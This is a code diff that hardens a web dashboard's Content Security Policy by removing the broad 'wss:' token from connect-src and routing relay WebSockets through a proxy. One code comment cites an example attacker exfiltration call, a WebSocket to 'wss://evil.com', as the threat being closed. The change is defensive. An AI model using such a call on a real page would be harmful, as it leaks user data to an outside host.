@@ -102,7 +102,14 @@ export const HTML_SECURITY_HEADERS: Record<string, string> = {
     // as a follow-up audit.
     "script-src 'self'",
     "style-src 'self' 'unsafe-inline'",
-    "connect-src 'self' ws://127.0.0.1:* ws://localhost:* wss:",
+    // External relay WS goes through /api/relay-proxy (see
+    // src/lib/routes/relay-proxy.ts) so the dashboard origin is the
+    // only place the browser ever connects to. Loopback ws://*
+    // remains for the in-process relay and the terminal WS upgrade.
+    // Closes the "future XSS exfiltrates via new WebSocket('wss://evil.com')"
+    // channel — without the proxy that connection would succeed under
+    // the old `wss:` token.
+    "connect-src 'self' ws://127.0.0.1:* ws://localhost:*",
     // img-src tightened from 'self' data: https: → 'self' data:.
     // Every external image now routes through /api/img-proxy (see
     // src/lib/img-proxy.ts) so the response bytes arrive over the
